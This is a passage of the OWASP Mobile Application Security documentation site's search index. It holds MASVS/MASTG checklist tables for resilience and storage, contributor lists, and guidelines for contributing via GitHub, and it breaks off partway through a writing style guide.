MASTG-TEST-0040  Testing for Debugging Symbols platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0051  Testing Obfuscation platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0041  Testing for Debugging Code and Verbose Error Logging platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0093  Testing Obfuscation platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0084  Testing for Debugging Code and Verbose Error Logging platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0083  Testing for Debugging Symbols platform:ios profile:R deprecatedstatus:deprecated MASVS-RESILIENCE-4 The app implements anti-dynamic analysis techniques. MASTG-TEST-0039  Testing whether the App is Debuggable platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0048  Testing Reverse Engineering Tools Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0046  Testing Anti-Debugging Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0089  Testing Anti-Debugging Detection platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0082  Testing whether the App is Debuggable platform:ios profile:R deprecatedstatus:deprecated MASTG-TEST-0091  Testing Reverse Engineering Tools Detection platform:ios profile:R update-pendingstatus:update-pending <p></p> <p></p>","tags":[]},{"location":"checklists/MASVS-STORAGE/","title":"MASVS-STORAGE","text":"<p>Checklists Updated (June 2025)</p> <p>The checklists now include all MASTG tests, as well as updated mappings to the new MAS profiles.</p> MASVS-ID MASTG-TEST-ID Control / MASTG Test Platform L1 L2 R P Status MASVS-STORAGE-1 The app securely stores sensitive data. MASTG-TEST-0001  Testing Local Storage for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0012  Testing the Device-Access-Security Policy platform:android profile:L2 deprecatedstatus:deprecated MASTG-TEST-0052  Testing Local Data Storage platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASVS-STORAGE-2 The app prevents leakage of sensitive data. MASTG-TEST-0003  Testing Logs for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0005  Determining Whether Sensitive Data Is Shared with Third Parties via Notifications platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0009  Testing Backups for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0004  Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0006  Determining Whether the Keyboard Cache Is Disabled for Text Input Fields platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0011  Testing Memory for Sensitive Data platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0054  Determining Whether Sensitive Data Is Shared with Third Parties platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0055  Finding Sensitive Data in the Keyboard Cache platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0060  Testing Memory for Sensitive Data platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0053  Checking Logs for Sensitive Data platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0058  Testing Backups for Sensitive Data platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending <p></p> <p></p>","tags":[]},{"location":"contributing/","title":"Contributing to the MAS Project","text":"<p>First of all, \u2b50 Give us a Star in GitHub!</p> <p></p> <p></p> <p>The MAS project is an open source effort and we welcome all kinds of contributions and feedback.</p> <p>Help us improve &amp; join our community:</p> <ul> <li>\ud83d\udc1e Report an error (typos, grammar) or fix it on a Pull Request.</li> <li>\ud83d\udcac Give feedback (MASTG/MASVS).</li> <li>\ud83d\ude4f Ask questions (MASTG/MASVS).</li> </ul> <p>Contribute with content:</p> <ul> <li>\ud83d\udca1 Propose ideas or suggest improvements (MASTG/MASVS). If it qualifies we'll promote it to an Issue.</li> <li>\ud83d\udcc4 Create a Pull Request for concrete fixes (e.g. grammar/typos) or content already approved by the core team.</li> </ul> <p>Before you start contributing, please check our pages \"How Can You Contribute?\" and \"Getting Started\". If you have any doubts please contact us.</p>","tags":[]},{"location":"contributing/#what-not-to-do","title":"\ud83d\udeab What not to do","text":"<p>Although we greatly appreciate any and all contributions to the project, there are a few things that you should take into consideration:</p> <ul> <li>No advertisement: The OWASP mobile Security Project cannot be used as a platform for advertisement of commercial tools, companies or individuals. Technical content such as the implementation of certain techniques or tests should be written with free and open-source tools in mind. Commercial tools are typically not accepted, but might be referenced in some specific cases.</li> <li>No unnecessary self-promotion of tools or blog posts: If you have a relation with one of the URLs or tools you are referencing, please state so in the PR so that we can verify that the reference is in line with the rest of the guide.</li> </ul> <p>Please be sure to take a careful look at our Code of Conduct for all the details and ask us in case of doubt.</p>","tags":[]},{"location":"contributing/#tool-inclusion-disclaimer-for-contributors","title":"Tool Inclusion Disclaimer for Contributors","text":"<p>OWASP MASTG encourages community contributions, including security testing tools that provide clear and practical value. However, all tool submissions are subject to review and may be rejected if they appear to be self-promotional, lack relevance, or do not meet minimum quality standards (e.g., documentation, usability, maintenance).</p> <p>To be considered for inclusion, tools should be:</p> <ul> <li>Open source or freely accessible</li> <li>Clearly documented and usable by the community</li> <li>Actively maintained, with updates tracking Android and iOS platform changes whenever applicable</li> </ul> <p>Even after inclusion, tools are subject to removal if they become outdated, broken, unmaintained, or otherwise no longer align with the goals of the MASTG. Inclusion is not permanent and does not imply endorsement by OWASP.</p> <p>In instances where no suitable open-source alternative exists, we may include closed-source tools. However, any closed-source tools included must be free to use, as we aim to avoid featuring paid tools whenever possible. This also extends to freeware or community editions of commercial tools.</p> <p>Our goal is to be vendor-neutral and to serve as a trusted learning resource, which is why we've avoid the inclusion of \"automated mobile application security scanners\" due to the competitive challenges they pose. Instead, we focus on tools that provide full code access and comprehensive testing, as they are better suited for educational purposes. Tools that lack this transparency, even if they offer a free version, typically do not meet the OWASP MAS project's inclusion criteria.</p> <p></p>","tags":[]},{"location":"contributing/#our-contributors","title":"Our Contributors","text":"<p>All of our contributors are listed in GitHub repos. See OWASP MASTG Authors &amp; Co-Authors, MASTG Contributors and MASVS Contributors.</p> <p>Update March 2023: We're creating a new concept for contributions that aligns with the new MASTG v2 workflows. Stay tuned...</p> <p></p>","tags":[]},{"location":"contributing/#owasp-mas-project-featured-contributions","title":"OWASP MAS Project Featured Contributions","text":"<ul> <li>Damien Clochard (Automation in GitHub Actions with pandocker)</li> <li>Loni Jacobsen (Access to Corellium)</li> </ul>","tags":[]},{"location":"contributing/#owasp-masvs-v2","title":"OWASP MASVS V2","text":"<p>Coming soon...</p>","tags":[]},{"location":"contributing/#owasp-mastg-v2","title":"OWASP MASTG V2","text":"<p>Coming soon...</p>","tags":[]},{"location":"contributing/#owasp-masvs-v1","title":"OWASP MASVS V1","text":"<p>The latest version of the MASVS v1 including all translations is available here: https://github.com/OWASP/masvs/releases/tag/v1.5.0</p> Project Lead Lead Author Contributors and Reviewers Sven Schleier and Carlos Holguera Bernhard Mueller, Sven Schleier, Jeroen Willemsen and Carlos Holguera Alexander Antukh, Mesheryakov Aleksey, Elderov Ali, Bachevsky Artem, Jeroen Beckers, Jon-Anthoney de Boer, Ben Cheney, Will Chilcutt, Stephen Corbiaux, Ratchenko Denis, Ryan Dewhurst, @empty_jack, Ben Gardiner, Manuel Delgado, Anton Glezman, Josh Grossman, Sjoerd Langkemper, Vin\u00edcius Henrique Marangoni, Martin Marsicano, Roberto Martelloni, @PierrickV, Julia Potapenko, Andrew Orobator, Mehrad Rafii, Javier Ruiz, Abhinav Sejpal, Stefaan Seys, Yogesh Sharma, Prabhant Singh, Nikhil Soni, Anant Shrivastava, Francesco Stillavato, Abdessamad Temmar, Pauchard Thomas, Lukasz Wierzbicki <p></p> Language Translators &amp; Reviewers Brazilian Portuguese Mateus Polastro, Humberto Junior, Rodrigo Araujo, Maur\u00edcio Ariza, Fernando Galves Chinese (Traditonal) Peter Chi, Lex Chien, Henry Hu, Leo Wang Chinese (Simplified) Bob Peng, Harold Zang, Jack S French Romuald Szkudlarek, Abderrahmane Aftahi, Christian Dong (Review) German Rocco Gr\u00e4nitz, Sven Schleier (Review) Hindi Mukesh Sharma, Ritesh Kumar, Kunwar Atul Singh, Parag Dave, Devendra Kumar Sinha, Vikrant Shah Japanese Koki Takeyama, Riotaro Okada (Review) Korean Youngjae Jeon, Jeongwon Cho, Jiyou Han, Jiyeon Sung Persian Hamed Salimian, Ramin Atefinia, Dorna Azhirak, Bardiya Akbari, Mahsa Omidvar, Alireza Mazhari, Milad Khoshdel Portuguese Ana Filipa Mota, Fernando Nogueira, Filipa Gomes, Luis Fontes, S\u00f3nia Dias Russian Gall Maxim, Eugen Martynov, Chelnokov Vladislav, Oprya Egor, Tereshin Dmitry Spanish Martin Marsicano, Carlos Holguera Turkish An\u0131l Ba\u015f, Haktan Emik Greek Panagiotis Yialouris","tags":[]},{"location":"contributing/#owasp-mastg-v1","title":"OWASP MASTG V1","text":"<p>The latest version of the MASTG v1 is available here: https://github.com/OWASP/mastg/releases/tag/v1.5.0</p> <p>Note: This contributor table is generated based on our GitHub contribution statistics. For more information on these stats, see the GitHub Repository README. We manually update the table, so be patient if you're not listed immediately.</p> <ul> <li>Reviewers: Reviewers have consistently provided useful feedback through GitHub issues and pull request comments.</li> <li>Top Contributors: Top contributors have consistently contributed quality content and have at least 500 additions logged in the GitHub repository.</li> <li>Contributors: Contributors have contributed quality content and have at least 50 additions logged in the GitHub repository.</li> <li>Mini Contributors: Many other contributors have committed small amounts of content, such as a single word or sentence (less than 50 additions).</li> </ul> Authors Reviewers Top Contributors Contributors Mini Contributors Editors Bernhard Mueller, Sven Schleier, Jeroen Willemsen, Carlos Holguera Jeroen Beckers, Sjoerd Langkemper, Anant Shrivastava Pawel Rzepa, Francesco Stillavato, Henry Hoggard, Andreas Happe, Kyle Benac, Paulino Calderon, Alexander Anthuk, Caleb Kinney, Abderrahmane Aftahi, Koki Takeyama, Wen Bin Kong, Abdessamad Temmar, Cl\u00e1udio Andr\u00e9, Slawomir Kosowski, Bolot Kerimbaev, Lukasz Wierzbicki kryptoknight13, DarioI, luander, oguzhantopgul, Osipion, mpishu, pmilosev, isher-ux, thec00n, ssecteam, jay0301, magicansk, jinkunong, nick-epson, caitlinandrews, dharshin, raulsiles, righettod, karolpiateknet, mkaraoz, Sjord, bugwrangler, jasondoyle, joscandreu, yog3shsharma, ryantzj, rylyade1, shivsahni, diamonddocumentation, 51j0, AnnaSzk, hlhodges, legik, abjurato, serek8, mhelwig, locpv-ibl and ThunderSon. jonasw234, zehuanli, jadeboer, Isopach, prabhant, jhscheer, meetinthemiddle-be, bet4it, aslamanver, juan-dambra, OWASP-Seoul, hduarte, TommyJ1994, forced-request, D00gs, vasconcedu, mehradn7, whoot, LucasParsy, DotDotSlashRepo, enovella, ionis111, vishalsodani, chame1eon, allRiceOnMe, crazykid95, Ralireza, Chan9390, tamariz-boop, abhaynayar, camgaertner, EhsanMashhadi, fujiokayu, decidedlygray, Ali-Yazdani, Fi5t, MatthiasGabriel, colman-mbuya and anyashka Heaven Hodges, Caitlin Andrews, Nick Epson, Anita Diamond, Anna Szkudlarek","tags":[]},{"location":"contributing/#owasp-mastg-beta","title":"OWASP MASTG Beta","text":"","tags":[]},{"location":"contributing/#owasp-mstg-beta-2-google-doc","title":"OWASP MSTG \"Beta 2\" (Google Doc)","text":"Authors Reviewers Top Contributors Milan Singh Thakur, Abhinav Sejpal, Blessen Thomas, Dennis Titze, Davide Cioccia, Pragati Singh, Mohammad Hamed Dadpour, David Fern, Ali Yazdani, Mirza Ali, Rahil Parikh, Anant Shrivastava, Stephen Corbiaux, Ryan Dewhurst, Anto Joseph, Bao Lee, Shiv Patel, Nutan Kumar Panda, Julian Sch\u00fctte, Stephanie Vanroelen, Bernard Wagner, Gerhard Wagner, Javier Dominguez Andrew Muller, Jonathan Carter, Stephanie Vanroelen, Milan Singh Thakur Jim Manico, Paco Hope, Pragati Singh, Yair Amit, Amin Lalji","tags":[]},{"location":"contributing/#owasp-mstg-beta-1-google-doc","title":"OWASP MSTG \"Beta 1\" (Google Doc)","text":"Authors Reviewers Top Contributors Milan Singh Thakur, Abhinav Sejpal, Pragati Singh, Mohammad Hamed Dadpour, David Fern, Mirza Ali, Rahil Parikh Andrew Muller, Jonathan Carter Jim Manico, Paco Hope, Yair Amit, Amin Lalji","tags":[]},{"location":"contributing/1_How_Can_You_Contribute/","title":"How Can You Contribute?","text":"<p>You can directly contribute to the MASVS, MASWE, or MASTG in many different ways!</p>","tags":[]},{"location":"contributing/1_How_Can_You_Contribute/#contribution-flow","title":"Contribution Flow","text":"<pre><code>flowchart LR\n    A(Open Discussion) --&gt;|discuss| C{qualifies?}\n    C --&gt;|Yes| D(Issue)\n    C --&gt;|No| E[Close]\n    D --&gt;|open PR| F(Pull Request)\n    F --&gt;|review| G{approved?}\n    F --&gt;|make changes| F\n    G --&gt;|Yes| H[Merge]\n    G --&gt;|No| I[Close]</code></pre> <p>Typically, contributors should follow the entire process. However, sometimes it's clear what's needed, so we create an issue or open a PR directly. We recommend starting with a discussion to save you from the hassle of writing and submitting content that does not qualify, which would result in it being rejected after the work is done.</p> How to contribute Description MASVS MASWE MASTG  Participate in Discussions Ask questions, give feedback, or propose ideas. Discussions Discussions Discussions  Create Issues Report concrete actionable things such as missing content, errors, or improvements. Issues Issues Issues  Open Pull Requests Submit new content, updates or fixes. Pull Requests Pull Requests Pull Requests  Review Pull Requests Review technical content or fix typos. Pull Requests Pull Requests Pull Requests","tags":[]},{"location":"contributing/2_Getting_Started/","title":"Getting Started","text":"<p>First, create a GitHub account for free.</p>","tags":[]},{"location":"contributing/2_Getting_Started/#contribute-online","title":"Contribute Online","text":"<p>GitHub makes this extremely easy.</p> <p>For small changes in one file:</p> <ol> <li>Go to the file you'd like to modify and click on \"Edit\".</li> <li>Do your changes and commit them. GitHub will guide you and suggest to open a Pull Request.</li> </ol> <p>For more complex changes or across files:</p> <ol> <li>Press <code>.</code> while browsing the repo or pull request.</li> <li>You'll be welcomed with a \"github.dev Web-based Editor\" where you can work using an online Visual Studio.</li> <li>Do your changes, commit and push them as you'd do locally.</li> </ol> <p></p> <p>Learn more about the github.dev Web-based Editor in \"GitHub Docs\".</p> <p>Finally, you'll be prompted to open a Pull Request (PR). Please follow the PR guidelines when opening a PR and get your Pull Request reviewed.</p>","tags":[]},{"location":"contributing/2_Getting_Started/#contribute-offline","title":"Contribute Offline","text":"<p>For this you need an IDE or text editor and git on your machine. We recommend using the free Visual Studio Code editor with the markdownlint extension.</p> <ol> <li>Fork the repo. Forking the repo allows you to make your changes without affecting the original project until you're ready to merge them.</li> <li> <p>Clone your fork repo and add the remote upstream repo, e.g. for the OWASP MASTG:</p> <pre><code>$ git clone https://github.com/&lt;your_github_user&gt;/mastg.git\n$ cd mastg/\n$ git remote add upstream git@github.com:OWASP/mastg.git\n</code></pre> </li> <li> <p>Create a branch.</p> <pre><code>$ git checkout -b fix-issue-1456\n</code></pre> </li> <li> <p>Make your changes.</p> </li> <li>Commit and push your changes. This can be done by executing the command <code>git add MYFILE</code> for every file you have modified, followed by <code>git commit -m 'Your Commit Message'</code> to commit the modifications and <code>git push</code> to push your modifications to GitHub.</li> <li>Open a PR.</li> <li>Get your PR reviewed.</li> </ol>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/","title":"Pull Requests &amp; Reviews","text":"","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-participate-in-discussions","title":"How to Participate in Discussions","text":"<p> Open a Discussion to ask questions, give feedback, and propose new ideas. If your proposal qualifies, we'll convert it into an \"Issue\" (the discussion might take a while).</p> <p>For example, you can start a discussion like \"Add a weakness about key rotation\" for MASWE or \"Add a test case for key rotation on Android\" for MASTG.</p> <p>Once you get your answer please mark it as answered. When you mark a question as an answer, GitHub will highlight the comment and replies to the comment to help visitors quickly find the answer.</p> <p></p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-create-issues","title":"How to Create Issues","text":"<p> Create an issue before opening a pull request. Clearly describe the problem or feature you plan to work on.</p> <p>Before creating an issue:</p> <ul> <li>Check if it already exists. If you find a related issue, comment on it instead of creating a new one.</li> <li>Break down complex problems into smaller tasks (issues) if possible.</li> </ul> <p>When creating an issue, please follow these guidelines:</p> <ul> <li>Use a clear and descriptive title.</li> <li>Include detailed context, steps to reproduce (if reporting a bug), and expected behavior.</li> </ul> <p>Next, if you'd like to work on the issue, you request to be assigned to it. You can do this by clicking on the \"Assignees\" section in the right sidebar of the issue page and selecting yourself or asking to be assigned by a maintainer.</p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-open-a-pr","title":"How to Open a PR","text":"<p> Open a PR to contribute with content or corrections.</p> <ul> <li>The target branch should be <code>master</code> or <code>main</code>.</li> <li>If your PR closes an issue, write \"Closes <code>#&lt;issue-id&gt;</code>\" at the beginning of the PR description.</li> <li>Follow our style guide when writing content.</li> <li>Self-review your changes locally and in GitHub.</li> </ul> <p>Next, you can request a review as described in the next section.</p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-get-your-pr-reviewed","title":"How to Get your PR Reviewed","text":"<p> Request a review from one of our maintainers or contributors. You can do this by clicking on the \"Reviewers\" section in the right sidebar of the PR page and selecting the user(s) you want to review your PR.</p> <p>If you do not have the correct permissions to request a review, please write a comment on the PR mentioning us (<code>@cpholguera</code>, <code>@sushi2k</code> or <code>@TheDauntless</code>) and we will assign a reviewer for you.</p> <p>Once a review is requested, it will be reviewed by one of our maintainers or contributors. They will check your changes and provide feedback.</p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-incorporate-the-reviewers-feedback-to-your-pr","title":"How to Incorporate the Reviewer's Feedback to your PR","text":"<p> Incorporate feedback from reviewers into your PR by following these steps:</p> <ul> <li>Apply any Suggested Changes using the \"Commit suggestions\" button.</li> <li>In order to process a comment, simply make modifications directly to your branch and push normally. GitHub will automatically detect these changes and add them to your existing PR.</li> <li>As you update your PR and apply changes, mark each conversation as resolved.</li> <li>If you run into any merge issues, refer to this page to learn how to resolve them.</li> </ul> <p>NOTE: Remember to regularly sync your fork with the upstream repo: <code>git pull upstream/master</code></p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#how-to-review-a-pr","title":"How to Review a PR","text":"<p> Review PRs and also gain contributions.</p> <ul> <li>Request to be assigned to PRs that match your expertise.</li> <li>Be sure to follow our style guide when reviewing content.</li> </ul> <p>If you'd like to review an open PR please follow these steps:</p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#step-1-comment-and-suggest-changes","title":"Step 1: Comment and Suggest Changes","text":"<p> Comment on a PR using single or multi-line comments (click and drag to select the range of lines):</p> <p></p> <p>Always prefer making \"Suggested Changes\" using the <code>\u00b1</code> button:</p> <p></p> <p>If the suggestion you'd like to make cannot be expressed using \"suggested changes\" please enter a clear comment explaining what should be fixed (e.g. some paragraphs don't link properly or some essential information cannot be found and should be added).</p> <p>Using \"Suggested Changes\" saves you as a reviewer and the PR author a lot of time. And you get points (attributions) for the changes that you suggested (if the author commits them you become a co-author of those commits). If you're constant with your reviewer work you can apply to be recognize as an official reviewer in our Acknowledgements page.</p>","tags":[]},{"location":"contributing/3_PRs_and_Reviews/#step-2-submit-your-review","title":"Step 2: Submit your Review","text":"<p> Submit your review once you went through the whole PR.</p> <ol> <li>Click on \"Review changes\".</li> <li>Enter a comment for the contributor.</li> <li>Select the type of review you'd like to leave (Comment, Approve or Request Changes).</li> <li>Click on \"Submit review\".</li> </ol>","tags":[]},{"location":"contributing/4_Add_new_Language/","title":"Add a New Language","text":"","tags":[]},{"location":"contributing/4_Add_new_Language/#mastg-translations","title":"MASTG Translations","text":"<p>The MASTG is a living document that changes and adapts to the most recent security recommendations every day. While we do want to reach the maximum audience possible, our past experience shows that maintaining translations has proven to be an extremely challenging task. Therefore, please understand that any PRs containing MASTG translations will be declined, but you're free to do them on your own forks.</p> <p>\ud83c\uddef\ud83c\uddf5 A translation of the MASTG into Japanese is available on Github: https://github.com/coky-t/owasp-mstg-ja. Thanks to @coky-t for pushing this forward!</p>","tags":[]},{"location":"contributing/4_Add_new_Language/#masvs-translations","title":"MASVS Translations","text":"<p>Starting with MASVS v2.0.0, translations will no longer be included to focus on the development of MASTG v2.0.0. We encourage the community to create and maintain their own translations. Thank you to all the past translators who generously volunteered their time and expertise to make the MASVS accessible to non-English speaking communities. We truly appreciate your contributions and hope to continue working together in the future. The past MASVS v1.5.0 translations are still available in the MASVS repo.</p>","tags":[]},{"location":"contributing/5_Style_Guide/","title":"Style Guide","text":"<p>The following rules are meant to ensure consistency of the MASTG:</p> <ol> <li>Keep the content factual, brief and focused. Avoid duplicating other sections of the guide;</li> <li>Refrain from advertising commercial tools or services;</li> <li>When giving technical instructions, address the reader in the second person.</li> </ol> <p>Technical Writing</p> <p>We recommend you to take these free Google courses when writing or reviewing content for the MAS project:</p> <ul> <li>Google Technical Writing One</li> <li>Google Technical Writing Two</li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#1-how-to-write-content","title":"1. How to Write Content","text":"","tags":[]},{"location":"contributing/5_Style_Guide/#basic-principles","title":"Basic Principles","text":"<p>Ensure content has cohesion and coherence:</p> <ul> <li>Link ideas clearly and logically.</li> <li>Make sure each paragraph makes sense on its own and fits with the ones before and after it.</li> <li>Trim unnecessary words. Use clear, concise language instead of long or wordy sentences.</li> <li>Structure content for easy scanning. Use bullet points instead of dense paragraphs when possible.</li> <li>Convert passive voice to active voice wherever appropriate.</li> <li>Keep each paragraph focused on a single topic or idea.</li> <li>Start each section with the key point to guide the reader.</li> <li>Use punctuation marks correctly, including commas, parentheses, colons, em dashes, and semicolons.</li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#amount-of-content","title":"Amount of Content","text":"<p>The primary measure for amount of content on a page should be based on the purpose it serves.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#use-short-pages","title":"Use short pages","text":"<p>Those containing one or two screens of text at most. Users are scanning for link choices. Use longer pages (those that require more scrolling or reading) deeper within the chapter where content can be printed and read later.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#for-very-large-sections-of-information","title":"For very large sections of information","text":"<p>Consider creating a supporting document and linking to it from the page rather than displaying all the information directly on the page.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#gender-neutrality","title":"Gender Neutrality","text":"<p>The MASTG reaches all kind of people all over the world. To ensure inclusiveness and diversity, please refrain from using the following throughout the book:</p> <ul> <li>she / her / hers / herself</li> <li>he / him / his / himself</li> </ul> <p>Or any other constructions like \"he/she\", \"s/he\", \"his or her\". Instead, use the following gender-neutral alternatives:</p> <ul> <li>Omit the pronoun if possible: \"The user authenticates himself using ...\" -&gt; \"The user authenticates using ...\"</li> <li>Replace pronouns with \"the or \"a\": \"When the user enters his password ...\" -&gt; \"When the user enters the password ...\"</li> <li>Use plural nouns and pronouns: \"An attacker will use his jailbroken device ...\" -&gt; \"Attackers will use their jailbroken devices ...\"</li> <li>Use the second person: \"If the attacker runs this code, he can bypass ...\" -&gt; \"If you run this code, you can bypass ...\"</li> <li>Use the imperative: \"A developer should never use ... in his code\" -&gt; \"Never use ... in your code!\"</li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#timeliness-of-content","title":"Timeliness of Content","text":"<p>Keeping accurate and timely content establishes the OWASP MAS deliverables as a credible and trustworthy source of information.</p> <p>When using statistical data on your page, ensure that the information is current and up-to-date and is accompanied by the source from which it was derived, along with the date the data was compiled.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#content-for-the-digital-platform-versus-for-print","title":"Content for the Digital Platform Versus for Print","text":"<p>Write concise content that the user can read quickly and efficiently. For digital content - create shorter pages that are cross-linked. If your content is likely to be printed, create one long page.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#audience","title":"Audience","text":"<p>Write for an international audience with a basic level of technical understanding i.e. they have a mobile phone and know how to install an app. Avoid hard-to-translate slang words/phrases to ensure content is accessible to readers who aren't native English speakers.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#context-and-orientation","title":"Context and Orientation","text":"<p>Let the users know where they are on every page. Establish the topic by using a unique page heading.</p> <p>Include a clear and concise introduction where possible.</p> <p>Link to background information where necessary.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#write-so-people-will-read-with-joy","title":"Write so People Will Read with Joy","text":"<p>Use the following methods to increase scannability:</p> <ul> <li>Use left alignment for headings, subheadings, and text</li> <li>Link where appropriate</li> <li>Use lists rather than paragraphs wherever possible</li> <li>Use dashes <code>-</code> rather than asterisks <code>*</code> for lists</li> <li>Include only one main idea in each paragraph</li> <li>Put the most important information at the top</li> <li>Start the page with the conclusion as well as a short summary of the remaining content</li> <li>Use headings where applicable</li> <li>Use short, simple words that are to the point</li> <li>Be concise and focused</li> </ul> <p>For longer pages, use the following tools to make the page easily scannable:</p> <ul> <li>Anchor links</li> <li>Subheadings and relevant links</li> <li>Bulleted copy</li> <li>Meaningful graphics, or pull quotes, to break up larger blocks of text</li> <li>End links</li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#effective-use-of-lists","title":"Effective Use of Lists","text":"<p>When presenting your content in a list format:</p> <ul> <li>Use numbered lists when the order of entries is important.</li> <li>Use bulleted lists whenever the order of the entries is not important.</li> <li>Generally, limit the number of items in a single list to no more than nine.</li> <li>Generally, limit lists to no more than two levels: primary and secondary.</li> <li>Punctuate and capitalize list items consistently (CMOS 6.124-6.126).</li> <li>Don't add end punctuation to list items that are not complete sentences unless they complete the sentence that introduces the list.</li> <li>Use appropriate capitalization and end punctuation for list items that individually form complete sentences.</li> <li>If the list items complete an introductory sentence, end each (except the last item) with a comma and do not add \"and\" after the second-to-last item. End the last item with appropriate end punctuation (usu. a period).</li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#numbering-conventions","title":"Numbering Conventions","text":"<p>When using a number between zero and ten, spell out the number (e.g., \"three\" or \"ten\").</p> <p>When using any number higher than ten, use the numeric version (e.g., \"12\" or \"300\").</p>","tags":[]},{"location":"contributing/5_Style_Guide/#2-language","title":"2. Language","text":"","tags":[]},{"location":"contributing/5_Style_Guide/#american-spelling-and-terminology","title":"American Spelling and Terminology","text":"<p>Use American spelling and terminology.</p> <p>Change all British spelling and terminology to the American equivalents where applicable. This includes \"toward\" (US) vs. \"towards\" (UK), \"among\" (US) vs. \"amongst\" (UK), \"analyze\" (US) vs. \"analyse\" (UK), \"behavior\" (US) vs \"behaviour\" (UK), etc.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#plurals","title":"Plurals","text":"<p>Adhere to standard grammar and punctuation rules when it comes to pluralization of typical words.</p> <p>The plural of calendar years does not take the apostrophe before the \"s\". For example, the plural form of 1990 is 1990s.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#title-capitalization","title":"Title Capitalization","text":"<p>We follow the title case rules from the \"Chicago Manual of Style\":  </p> <ul> <li>Capitalize the first and last word in a title, regardless of part of speech</li> <li>Capitalize all nouns (app, encryption, package), pronouns (you, she, it), verbs (analyze, compile, inspect), adjectives (active, insecure, weak), adverbs (immediately, quietly), and subordinating conjunctions (as, because, although)</li> <li>Lowercase \"to\" as part of an infinitive</li> <li>Lowercase all articles (a, the), prepositions (to, at, in, with), and coordinating conjunctions (and, but, or)</li> </ul> <p>When in doubt, you can verify proper capitalization on https://titlecaseconverter.com/.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#standardization","title":"Standardization","text":"<p>The MAS project (MASVS, MASTG, MASWE) strives for consistent wording that is clear and unambiguous in context. However, due to the size of the project, there may be words or abbreviations that are used inconsistently and need to be standardised. If this is the case, please submit a pull request so that we can discuss them and suggest what should be used instead.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#contractions","title":"Contractions","text":"<p>Use the following common contractions:</p> <ul> <li>are not -&gt; aren't  </li> <li>cannot -&gt; can't  </li> <li>could not -&gt; couldn't  </li> <li>did not -&gt; didn't  </li> <li>do not -&gt; don't  </li> <li>does not -&gt; doesn't  </li> <li>has not -&gt; hasn't  </li> <li>had not -&gt; hadn't  </li> <li>have not -&gt; haven't</li> <li>is not -&gt; isn't</li> <li>it is -&gt; it's</li> <li>that is -&gt; that's  </li> <li>there is -&gt; there's  </li> <li>was not -&gt; wasn't  </li> <li>were not -&gt; weren't  </li> <li>will not -&gt; won't  </li> <li>would not -&gt; wouldn't  </li> <li>you are -&gt; you're  </li> <li>you have + verb -&gt; you've + verb</li> <li>you will -&gt; you'll  </li> </ul>","tags":[]},{"location":"contributing/5_Style_Guide/#abbreviations","title":"Abbreviations","text":"<p>Abbreviations include acronyms, initialisms, shortened words, and contractions.</p> <ul> <li>Spell out the term the first time it's used, followed by the abbreviation in parentheses. Example: OWASP Mobile Application Security Testing Guide (MASTG). Subsequent usages in the same chapter may include the abbreviation only.</li> <li>If it only appears once in the content, spell out the term instead of using the abbreviation.</li> <li>In titles and headings, use the abbreviation but be sure to properly introduce it (see above) in the text that follows.</li> <li>Use \"a\" or \"an\" depending on the pronunciation of the acronym. Example: a DLL, an APK, a URL, a SQL.</li> <li>Add an \"s\" for the plural form unless the abbreviation already stands for a plural noun. Example: the APIs, CSS (not CSSs).</li> <li>If the abbreviation is better known as its full spelled-out term, use only the abbreviation. Example: PDF, URL, USB, ZIP.</li> </ul> <p>The following snippet demonstrates most of these points:</p> <pre><code>## JAR Files\n\nJAR (Java ARchive) files are [...]\n\nAPKs are packed using the ZIP format. An APK is a variation of a JAR file [...]\n</code></pre> <p>For commonly used file formats such as APK, IPA or ZIP, please do not refer to them as \".apk\", \".ipa\" or \".zip\" unless you're explicitly referring to the file extension.</p>","tags":[]},{"location":"contributing/5_Style_Guide/#referencing-android-versions","title":"Referencing Android 